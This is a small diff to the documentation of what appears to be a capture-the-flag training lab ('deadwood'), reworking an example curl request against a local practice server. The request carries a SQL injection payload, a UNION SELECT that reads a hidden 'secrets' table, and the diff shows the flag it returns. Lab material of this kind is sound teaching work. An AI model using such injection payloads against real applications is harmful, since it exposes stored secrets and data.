@@ -56,7 +56,8 @@ like — here, the hidden `secrets`:
 
 ```console
 $ deadwood serve &
-$ curl 'http://127.0.0.1:8666/l/first-blood/app?id=0 UNION SELECT 1,label,value FROM secrets'
+$ curl -G 'http://127.0.0.1:8666/l/first-blood/app' \
+       --data-urlencode 'id=0 UNION SELECT 1,label,value FROM secrets'
 ...
 DEADWOOD{first_blood_825bb8670d30d32c}
 
